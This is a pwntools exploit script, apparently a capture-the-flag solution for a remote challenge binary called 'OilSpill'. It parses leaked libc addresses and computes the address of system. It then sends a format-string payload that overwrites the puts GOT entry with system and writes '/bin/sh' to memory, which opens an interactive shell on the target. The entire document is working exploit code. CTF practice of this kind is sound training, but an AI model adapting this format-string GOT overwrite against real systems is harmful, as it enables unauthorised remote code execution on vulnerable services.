# offset = 8

from pwn import *

context(arch="amd64", os="linux", log_level="debug")
io = remote("node5.anna.nssctf.cn", 20583)
elf = ELF("./OilSpill")
libc = ELF("./libc6_2.27-3ubuntu1.6_amd64.so")

puts_addr = int(io.recvuntil(b", ")[:-2], 16)
printf_addr = int(io.recvuntil(b", ")[:-2], 16)
s_addr = int(io.recvuntil(b", ")[:-2], 16)
temp_addr = int(io.recvuntil(b"\n")[:-1], 16)
x_addr = 0x600C80
libc_base = puts_addr - libc.sym["puts"]
system_addr = libc_base + libc.sym["system"]
print("puts address = ", hex(puts_addr))
print("printf address = ", hex(printf_addr))
print("s address = ", hex(s_addr))
print("temp address = ", hex(temp_addr))
print("libc base address = ", hex(libc_base))
print("system address = ", hex(system_addr))


payload = fmtstr_payload(8, {elf.got['puts']:system_addr, x_addr:b"/bin/sh\x00"})

io.sendline(payload)
io.interactive()
